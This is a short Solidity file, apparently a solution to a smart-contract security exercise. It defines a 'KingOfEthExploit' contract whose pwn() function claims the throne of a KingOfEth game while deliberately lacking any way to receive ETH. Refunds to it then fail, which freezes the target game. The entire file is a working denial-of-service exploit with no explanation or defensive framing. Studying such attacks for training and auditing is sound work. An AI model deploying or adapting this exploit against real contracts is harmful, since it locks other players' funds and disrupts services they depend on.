// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Interface for the KingOfEth contract.
interface IKingOfEth {
    // Function to play the KingOfEth game by sending ETH.
    function play() external payable;
}

contract KingOfEthExploit {
    // Address of the target KingOfEth contract.
    IKingOfEth public target;

    // Constructor to set the target KingOfEth contract address.
    constructor(IKingOfEth _target) {
        target = _target;
    }
    
    // No fallback function to accept ETH in this contract.

    // Function to perform the exploit and play the KingOfEth game.
    function pwn() external payable {
        // Call the play function of the target KingOfEth contract and send ETH with the call.
        target.play{value: msg.value}();
    }
}